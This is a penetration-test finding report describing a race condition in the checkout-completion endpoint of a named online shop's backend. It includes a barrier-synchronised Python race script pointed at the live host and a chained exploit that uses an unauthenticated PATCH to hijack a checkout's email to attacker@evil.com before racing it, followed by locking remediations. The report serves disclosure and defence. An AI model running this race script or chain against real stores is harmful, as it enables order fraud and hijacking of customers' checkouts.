🔴 Race Condition — 3 Orders From 1 Checkout

AUTHORIZED SECURITY RESEARCH ONLY. This report documents findings discovered during a contracted penetration test of premiumalts.to. All tests were performed under explicit written authorization using dedicated test accounts and test data. No production user data or funds were accessed or retained.
CRITICAL CWE-362: Race Condition F-159 — Session 13 2026-04-24

Summary

The POST /checkout/{id}/complete handler on backend.premiumalts.to lacks an atomic database lock. When 15 threads simultaneously POST to the same active checkout, the server creates 3 distinct orders — each with a real Icenox payment URL — from a single basket. An attacker can exploit this to generate multiple valid payment demands for one product, clone order references, or receive free goods by racing a checkout they never intend to pay.

Root Cause

The /complete handler performs a read-check-update pattern without holding a database-level lock: 

// Pseudocode — reconstructed from observed behaviour
Checkout checkout = checkoutRepo.findById(id);   // 1. READ — all 15 threads pass here
if (checkout.status != ACTIVE) throw 400;       // 2. CHECK — all 15 pass before any write
checkout.status = COMPLETED;                      // 3. UPDATE — all 15 commit distinct orders
Order order = orderRepo.save(new Order(checkout));
paymentService.createIcenoxLink(order);

Because steps 1–3 execute outside a serialisable transaction or pessimistic lock, all 15 concurrent requests pass the status != ACTIVE guard before any of them commits the COMPLETED update — a classic TOCTOU window.

Attack Chain

1

Create checkout. Attacker (or victim's session, stolen via F-155b) creates a basket: POST /checkout → UUID returned (or read via GET IDOR).

2

Fire race. Attacker fires 15–50 simultaneous POST /checkout/{id}/complete requests using a thread barrier so all requests reach the server within the same millisecond window.

3

Multiple orders created. Server issues N > 1 HTTP 200 responses, each containing a distinct orderId and live Icenox payment URL. Seller fulfils all N orders.

4

Amplification via PATCH IDOR (F-155b). Since PATCH /checkout/{id}/customer requires zero authentication, an unauthenticated attacker can race any victim's checkout, not just their own.

Proof of Concept

Executed 2026-04-24 against checkout 4b53d862-eadd-4eea-8c96-9a3b9eb305d4 (test account, €38.95 product).

Race Script (Python — barrier-synchronised)

import concurrent.futures, threading, requests

CHECKOUT_ID = "4b53d862-eadd-4eea-8c96-9a3b9eb305d4"
URL         = f"https://backend.premiumalts.to/checkout/{CHECKOUT_ID}/complete"
PAYLOAD     = {"customerEmail": "test@blockageguard.app", "customerName": "BlockageTest"}
THREADS     = 15

barrier = threading.Barrier(THREADS)

def fire():
    barrier.wait(timeout=5)          # all threads release simultaneously
    r = requests.post(URL, json=PAYLOAD, timeout=15)
    return r.status_code, r.json()

with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as pool:
    results = list(pool.map(lambda _: fire(), range(THREADS)))

Chained Attack (F-155b + F-159)

When combined with the unauthenticated PATCH /checkout/{id}/customer (F-155b), this race becomes exploitable with zero authentication:

# Step 1 — Read victim checkout UUID (GET IDOR, no auth required)
GET /checkout/4b53d862-eadd-4eea-8c96-9a3b9eb305d4  →  200 OK, full basket details

# Step 2 — Hijack customer email (no auth required)
PATCH /checkout/4b53d862-eadd-4eea-8c96-9a3b9eb305d4/customer
{"customerEmail": "attacker@evil.com", "customerName": "Attacker"}
→  200 OK

# Step 3 — Race the completion, claim N orders
POST /checkout/4b53d862-eadd-4eea-8c96-9a3b9eb305d4/complete  ×15 threads
→  3 × 200 OK, 3 live Icenox URLs issued in attacker's name

Remediation

Option A — Optimistic Locking (Spring Boot / JPA)

@Entity
public class Checkout {
    @Version
    private Long version;   // JPA increments on every UPDATE
    // ...
}

JPA raises OptimisticLockException on concurrent updates; wrap in @Retryable or return HTTP 409 Conflict to the loser threads.

Option B — Pessimistic Locking (SQL)

SELECT * FROM checkouts
  WHERE id = :id AND status = 'ACTIVE'
  FOR UPDATE;

Holds a row-level lock; subsequent transactions block until the first commits. Use Spring Data @Lock(LockModeType.PESSIMISTIC_WRITE).

Option C — Conditional UPDATE (database-atomic)

UPDATE checkouts
  SET status = 'COMPLETED'
  WHERE id = :id AND status = 'ACTIVE';

-- Then check rows_affected == 1; if 0, checkout already completed → 409

Most portable; works without JPA. Check rows_affected and return HTTP 409 to any thread that loses the race.
